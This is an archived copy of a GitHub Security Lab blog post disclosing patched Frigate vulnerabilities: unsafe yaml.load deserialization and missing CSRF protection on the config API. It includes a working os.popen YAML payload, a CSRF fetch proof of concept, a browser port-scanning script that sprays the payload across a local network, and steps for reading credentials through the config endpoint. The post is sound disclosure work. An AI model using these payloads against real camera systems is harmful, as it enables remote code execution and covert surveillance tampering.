---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-12-13_securing-our-home-labs-frigate-code-review.md
original_filename: 2023-12-13_securing-our-home-labs-frigate-code-review.md
title: 'Securing our home labs: Frigate code review'
category: documents
detected_topics:
- api-security
- command-injection
- csrf
- oauth
- access-control
- ssrf
tags:
- imported
- documents
- api-security
- command-injection
- csrf
- oauth
- access-control
- ssrf
language: en
raw_sha256: ef7690e8ca984bc1c75e8ec1d9cc3e87b92ea644c7f409b33a19e87f36fa5159
text_sha256: 1c9aaefc93856266f5bb6c616fde79c1ea890f502537619d7dc650e02c108401
ingested_at: '2026-06-28T07:32:28Z'
sensitivity: unknown
redactions_applied: false
---

# Securing our home labs: Frigate code review

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-12-13_securing-our-home-labs-frigate-code-review.md
- Source Type: markdown
- Detected Topics: api-security, command-injection, csrf, oauth, access-control, ssrf
- Ingested At: 2026-06-28T07:32:28Z
- Redactions Applied: False
- Raw SHA256: `ef7690e8ca984bc1c75e8ec1d9cc3e87b92ea644c7f409b33a19e87f36fa5159`
- Text SHA256: `1c9aaefc93856266f5bb6c616fde79c1ea890f502537619d7dc650e02c108401`


## Content

---
title: "Securing our home labs: Frigate code review"
page_title: "Securing our home labs: Frigate code review - The GitHub Blog"
url: "https://github.blog/2023-12-13-securing-our-home-labs-frigate-code-review/"
final_url: "https://github.blog/security/vulnerability-research/securing-our-home-labs-frigate-code-review/"
authors: ["Logan MacLaren", "Jorge Rosillo (@jorge_ctf)"]
programs: ["Frigate"]
bugs: ["OAuth", "Broken authorization", "Broken authentication", "SSRF", "CI/CD", "Supply chain attack", "Security code review"]
publication_date: "2023-12-13"
added_date: "2024-01-29"
source: "pentester.land/writeups.json"
original_index: 632
---

[Home](https://github.blog/) / [Security](https://github.blog/security/) / [Vulnerability research](https://github.blog/security/vulnerability-research/)

# Securing our home labs: Frigate code review

This blog post describes two linked vulnerabilities found in Frigate, an AI-powered security camera manager, that could have enabled an attacker to silently gain remote code execution.

![](https://github.blog/wp-content/uploads/2023/10/Security-DarkMode-4.png?resize=1200%2C630)

[Logan MacLaren](https://github.blog/author/maclarel/ "Posts by Logan MacLaren") & [Jorge Rosillo](https://github.blog/author/jorgectf/ "Posts by Jorge Rosillo")

December 13, 2023 

| 7 minutes 

  * Share: 
  * [ ](https://x.com/share?text=Securing%20our%20home%20labs%3A%20Frigate%20code%20review&url=https%3A%2F%2Fgithub.blog%2Fsecurity%2Fvulnerability-research%2Fsecuring-our-home-labs-frigate-code-review%2F)
  * [ ](https://www.facebook.com/sharer/sharer.php?t=Securing%20our%20home%20labs%3A%20Frigate%20code%20review&u=https%3A%2F%2Fgithub.blog%2Fsecurity%2Fvulnerability-research%2Fsecuring-our-home-labs-frigate-code-review%2F)
  * [ ](https://www.linkedin.com/shareArticle?title=Securing%20our%20home%20labs%3A%20Frigate%20code%20review&url=https%3A%2F%2Fgithub.blog%2Fsecurity%2Fvulnerability-research%2Fsecuring-our-home-labs-frigate-code-review%2F)

At [GitHub Security Lab](https://securitylab.github.com/), we are continuously analyzing open source projects in line with our goal of **keeping the software ecosystem safe**. Whether by manual review, [multi-repository variant analysis](https://github.blog/2023-03-09-multi-repository-variant-analysis-a-powerful-new-way-to-perform-security-research-across-github/), or internal automation, we focus on [high-profile projects](https://openssf.org/blog/2023/07/28/understanding-and-applying-the-openssf-criticality-score-in-open-source-projects/#:~:text=a%20scoring%20system%20that%20assesses%20the%20relative%20importance%20of%20an%20open%20source%20project%20based%20on%20various%20signals%20and%20weights) we all depend on and rely on.

Following on our [Securing our home labs series](https://github.blog/2023-11-30-securing-our-home-labs-home-assistant-code-review/), this time, we (Logan MacLaren, [@maclarel](https://github.com/maclarel), and Jorge Rosillo, [@jorgectf](https://github.com/jorgectf)) paired in our duty of reviewing some of our automation results (leveraging [GitHub code scanning](https://docs.github.com/code-security/code-scanning/introduction-to-code-scanning/about-code-scanning)), when we came across an alert that would absorb us for a while. By the end of this post, you will be able to understand how to get remote code execution in a Frigate instance, even when the instance is not directly exposed to the internet.

## The target

![Screenshot of the homepage for Frigate \(frigate.video\)](https://github.blog/wp-content/uploads/2023/12/frigate-screenshot.png?w=1024&resize=1024%2C566)

[Frigate](https://frigate.video/) is an open source network video recorder that can consume video streams from a wide variety of consumer security cameras. In addition to simply acting as a recorder for these streams, it can also perform local object detection.

Furthermore, Frigate offers deep integrations with Home Assistant, which [we audited a few weeks ago](https://github.blog/2023-11-30-securing-our-home-labs-home-assistant-code-review/). With that, and given the significant deployment base (more than **1.6 million downloads** of [Frigate container](https://github.com/blakeblackshear/frigate/pkgs/container/frigate) at the time of writing), this looked like a great project to dig deeper into as a continuation for our previous research.

## Issues we found

Code scanning initially alerted us to several potential vulnerabilities, and the one that stood out the most was [deserialization of user-controlled data](https://codeql.github.com/codeql-query-help/python/py-unsafe-deserialization/), so we decided to dive into that one to start.

_Please note that the code samples outlined below are based on Frigate 0.12.1 and all vulnerabilities outlined in this report have been patched as of the latest beta release (0.13.0 Beta 3)._

### Insecure deserialization with `yaml.load` (CVE-2023-45672)

![Screenshot of a critical severity alert from CodeQL, "Deserialization of user-controlled data." The label at the top of the alert notes that it has been fixed.](https://github.blog/wp-content/uploads/2023/12/deserialization-screenshot.png?w=1024&resize=1024%2C509)

Frigate offers the ability to update its configuration in three ways—through a configuration file local to the system/container it runs on, through its UI, or through the `/api/config/save` REST API endpoint. When updating the configuration through any of these means there will eventually be a call to `load_config_with_no_duplicates` which is where this vulnerability existed.

Using the [`/api/config/save` endpoint](https://github.com/blakeblackshear/frigate/blob/5658e5a4cc7376504af9de5e1eff178939a13e7f/frigate/http.py#L998-L998) as an entrypoint, input is initially accepted through `http.py`:
  
  
  @bp.route("/config/save", methods=["POST"])
  def config_save():
  save_option = request.args.get("save_option")
  
  new_config = request.get_data().decode()
  

The user-provided input is then parsed and loaded by [`load_config_with_no_duplicates`](https://github.com/blakeblackshear/frigate/blob/5658e5a4cc7376504af9de5e1eff178939a13e7f/frigate/config.py#L1244-L1244):
  
  
  @classmethod
  def parse_raw(cls, raw_config):
  config = load_config_with_no_duplicates(raw_config)
  return cls.parse_obj(config)
  

However, `load_config_with_no_duplicates` uses [`yaml.loader.Loader`](https://github.com/blakeblackshear/frigate/blob/5658e5a4cc7376504af9de5e1eff178939a13e7f/frigate/util/builtin.py#L90) which can **instantiate custom constructors**. A provided payload will be executed directly:
  
  
  PreserveDuplicatesLoader.add_constructor(
  yaml.resolver.BaseResolver.DEFAULT_MAPPING_TAG, map_constructor
  )
  return yaml.load(raw_config, PreserveDuplicatesLoader)
  

In this scenario providing a payload like the following (invoking `os.popen` to run `touch /tmp/pwned`) was sufficient to achieve **remote code execution** :
  
  
  !!python/object/apply:os.popen
  - touch /tmp/pwned
  

### Cross-site request forgery in `config_save` and `config_set` request handlers (CVE-2023-45670)

Even though we can get code execution on the host (potentially a container) running Frigate, most installations are only exposed in the user local network, so an attacker cannot interact directly with the instance. We wanted to find a way to get our payload to the target system without needing to have direct access. Some further review of the API led us to find two notable things:

  1. The API does not implement any authentication (nor does the UI), instead relying on user-provided security (for example, an authentication proxy).
  2. No CSRF protections were in place, and the attacker does not really need to be able to read the cross-origin response, meaning that even with an authentication proxy in place a [“drive-by” attack](https://about.gitlab.com/blog/2021/09/07/why-are-developers-vulnerable-to-driveby-attacks/) would be feasible.

As a simple proof of concept (PoC), we created a web page that will run a Javascript function targeted to a server under our control and drop in our own configuration (note the camera name of `pwnd`):
  
  
  const pwn = async () =&gt; {
  const data = `mqtt:
  host: mqtt
  cameras:
  pwnd:
  ffmpeg:
  inputs:
  - path: /media/frigate/car-stopping.mp4
  input_args: -re -stream_loop -1 -fflags +genpts
  roles:
  - detect
  - rtmp
  detect:
  height: 1080
  width: 1920
  fps: 5`;
  
  
  await fetch("http://:5000/api/config/save?save_option=saveonly", {
  method: "POST",
  mode: "no-cors",
  body: data
  });
  }
  pwn();
  

### Putting these into action for a “ _drive-by_ ”

As we have a combination of an API endpoint that can update the server’s configuration without authentication, is vulnerable to a “drive-by” as it lacks CSRF protection, and a vulnerable configuration parser we can quickly move toward **0-click RCE** with **little or no knowledge of the victim’s network or Frigate configuration**.

For the purposes of this PoC, we have Frigate 0.12.1 running at 10.0.0.2 on TCP 5000.

Using the following Javascript we can scan an arbitrary network space (for example, 10.0.0.1 through 10.0.0.4) to find a service accepting connections on TCP 5000. This will iterate over any IP in the range we provide in the script and scan the defined port range. If it finds a hit, it will run the `pwn` function against it.
  
  
  // Tested and confirmed functional using Chrome 118.0.5993.88 with Frigate 0.12.1.
  
  const pwn = (host, port) =&gt; {
  const data = `!!python/object/apply:os.popen
  - touch /tmp/pwned`;
  
  fetch("http://" + host + ":" + port + "/api/config/save?save_option=saveonly", {
  method: "POST",
  mode: "no-cors",
  body: data
  });
  };
  
  const thread = (host, start, stop, callback) =&gt; {
  const loop = port =&gt; {
  if (port  {
  callback(port);
  loop(port + 1);
  }).catch(err =&gt; {
  loop(port + 1);
  });
  }
  };
  setTimeout(() =&gt; loop(start), 0);
  };
  
  const scanRange = (start, stop, thread_count) =&gt; {
  const port_range = stop - start;
  const thread_range = port_range / thread_count;
  for (let n = 0; n &lt; 5; n++) {
  let host = &quot;10.0.0.&quot; + n;
  for (let i = 0; i  {
  pwn(host, port);
  });
  }
  }
  }
  
  window.onload = () =&gt; {
  scanRange(4998, 5002, 2);
  };
  

This can, of course, be extended out to scan a larger IP range, multiple different IP ranges (for example, 192.168.0.0/24), different port ranges, etc. In short, the attacker does not need to know anything about the victim’s network or the location of the Frigate service—if it’s running on a predictable port a malicious request can easily be sent to it with no user involvement beyond accessing the malicious website. It is likely that this can be further extended to perform validation of the target prior to submitting a payload; however, the ability to “spray” a malicious payload in this fashion is sufficient for zero-knowledge exploitation without user interaction.

Credit to [wybiral/localscan](https://github.com/wybiral/localscan) for the basis of the Javascript port scanner.

#### Being a bit sneakier with the `/config` API

The `/config` API has three main capabilities:

  * Pull the existing config
  * Save a new config
  * Update an existing config

As Frigate, by default, has no authentication mechanism it’s possible to arbitrarily pull the configuration of the target server by sending a `GET` request to `:/api/config/raw`. While this may not seem too interesting at first, this can be used to pull MQTT credentials, RTSP password(s), and local file paths that we can take advantage of for exfiltration.

The `saveonly` option is useful if we wish to utilize the deserialization vulnerability; however, `restart` can actually have the server _running_ with a configuration under our control.

Combining these three capabilities with the CSRF vulnerability outlined above, it’s possible to not only achieve RCE (the most interesting path), but also to have Frigate running a malicious config in a way that’s largely invisible to the owner of the service.

In short, we can:

  * Pull the existing configuration from `/config/raw`.
  * Insert our own configuration (e.g. disabling recording, changing the MQTT server location, changing feeds to view cameras under our control, etc…—movie-style hacker stuff) and prompt the server to run with it using `/config/save`‘s `restart` argument.
  * Overwrite our malicious configuration with the original configuration _but not utilize it_ by again updating through `/config/save` using the `saveonly` argument.

## Conclusion

Frigate is a fantastic project, and it does what it aims to do very well, with significant customization options. Having said this, there remains considerable room for improvement with the out-of-the-box security configuration, so additional security protections are strongly recommended for deployments of this software.

At the time of writing the vulnerabilities outlined here have all been patched (>= 0.13.0 Beta 3) and the following GitHub Security Advisories and CVEs have been published:

  * [GHSA-xq49-hv88-jr6h](https://github.com/blakeblackshear/frigate/security/advisories/GHSA-xq49-hv88-jr6h) / [CVE-2023-45670](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-45670)
  * [GHSA-jjxc-m35j-p56f](https://github.com/blakeblackshear/frigate/security/advisories/GHSA-jjxc-m35j-p56f) / [CVE-2023-45671](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-45671)
  * [GHSA-qp3h-4q62-p428](https://github.com/blakeblackshear/frigate/security/advisories/GHSA-qp3h-4q62-p428) / [CVE-2023-45672](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-45672)

We also published our [advisory](https://securitylab.github.com/advisories/GHSL-2023-190_Frigate/) on the GitHub Security Lab page.

We encourage users of Frigate to update to the latest releases as soon as possible, and also you, fellow reader, to stay tuned for more blog posts in the _Securing our home labs_ series!

* * *

## Tags:

  * [ CodeQL ](https://github.blog/tag/codeql/)
  * [ GitHub Security Lab ](https://github.blog/tag/github-security-lab/)
  * [ open source ](https://github.blog/tag/open-source/)
  * [ security research ](https://github.blog/tag/security-research/)

##  Written by 

![Logan MacLaren](https://avatars.githubusercontent.com/u/21298298?v=4&s=200)

###  [Logan MacLaren](https://github.blog/author/maclarel/)

[@maclarel](https://github.com/maclarel)

![Jorge Rosillo](https://avatars.githubusercontent.com/u/46056498?v=4&s=200)

###  [Jorge Rosillo](https://github.blog/author/jorgectf/)

[@jorgectf](https://github.com/jorgectf)

  * [ CodeQL ](https://github.blog/tag/codeql/)
  * [ GitHub Security Lab ](https://github.blog/tag/github-security-lab/)
  * [ open source ](https://github.blog/tag/open-source/)
  * [ security research ](https://github.blog/tag/security-research/)

## More on [CodeQL](https://github.blog/tag/codeql/)

### [CodeQL zero to hero part 5: Debugging queries](https://github.blog/security/vulnerability-research/codeql-zero-to-hero-part-5-debugging-queries/)

Learn to debug and fix your CodeQL queries.

[Sylwia Budzynska](https://github.blog/author/sylwiabudzynska/ "Posts by Sylwia Budzynska")

### [Securing the supply chain at scale: Starting with 71 important open source projects](https://github.blog/open-source/maintainers/securing-the-supply-chain-at-scale-starting-with-71-important-open-source-projects/)

Learn how the GitHub Secure Open Source Fund helped 71 open source projects significantly improve their security posture through direct funding, expert guidance, and actionable playbooks.

[Kevin Crosby](https://github.blog/author/kevincrosby/ "Posts by Kevin Crosby") & [Gregg Cochran](https://github.blog/author/dubsopenhub/ "Posts by Gregg Cochran")

##  Related posts 

![A shield with a checkmark icon appears centered among decorative green blocks.](https://github.blog/wp-content/uploads/2026/01/github-generic-security-blocks-logo.png?resize=400%2C212)

[AI & ML](https://github.blog/ai-and-ml/)

###  [ Making secret scanning more trustworthy: Reducing false positives at scale ](https://github.blog/security/making-secret-scanning-more-trustworthy-reducing-false-positives-at-scale/)

Alerts are more trustworthy and actionable when noise is reduced. See how we improved the verification step with context-aware LLM reasoning.

[Mariko Wakabayashi](https://github.blog/author/mwakaba2/ "Posts by Mariko Wakabayashi")

![A grid of abstract cubes highlights a central cube displaying a shield with a checkmark to represent security.](https://github.blog/wp-content/uploads/2026/01/generic-security-logo-blocks-github.png?resize=400%2C212)

[Security](https://github.blog/security/)

###  [ Investigation update: GitHub Enterprise Server signing key rotation ](https://github.blog/security/investigating-unauthorized-access-to-githubs-internal-repositories/)

GitHub Enterprise Server customers need to take immediate action.

[Alexis Wales](https://github.blog/author/alexiswales/ "Posts by Alexis Wales")

![](https://github.blog/wp-content/uploads/2021/06/GitHub-Bug-Bounty.png?resize=400%2C212)

[Security](https://github.blog/security/)

###  [ Raising the bar: Quality, shared responsibility, and the future of GitHub’s bug bounty program ](https://github.blog/security/raising-the-bar-quality-shared-responsibility-and-the-future-of-githubs-bug-bounty-program/)

We’re updating our bug bounty program standards to prioritize quality submissions, clarify shared responsibility boundaries, and evolve how we reward low-risk findings.

[Jarom Brown](https://github.blog/author/jarombrown/ "Posts by Jarom Brown")

##  Explore more from GitHub 

![Docs](https://github.blog/wp-content/uploads/2024/07/Icon-Circle.svg)

###  Docs 

Everything you need to master GitHub, all in one place.

[ Go to Docs ](https://docs.github.com/)

![GitHub](https://github.blog/wp-content/uploads/2024/07/recirculation-github-icon.svg)

###  GitHub 

Build what’s next on GitHub, the place for anyone from anywhere to build anything.

[ Start building ](https://github.com/)

![Customer stories](https://github.blog/wp-content/uploads/2024/07/Icon_da43dc.svg)

###  Customer stories 

Meet the companies and engineering teams that build with GitHub.

[ Learn more ](https://github.com/customer-stories)

![GitHub Universe 2026](https://github.blog/wp-content/uploads/2025/06/Universe26-Icon.svg)

###  GitHub Universe 2026 

Join us October 28-29 in San Francisco or online for GitHub Universe, our flagship developer event uniting people, agents, and the world’s code.

[ Register now ](https://githubuniverse.com/?utm_source=Blog&utm_medium=GitHub&utm_campaign=module_uni_26)

## We do newsletters, too

Discover tips, technical guides, and best practices in our biweekly newsletter just for devs.

Your email address

* Your email address

Subscribe

Yes please, I’d like GitHub and affiliates to use my information for personalized communications, targeted advertising and campaign effectiveness. See the [GitHub Privacy Statement](https://github.com/site/privacy) for more details. 

Subscribe
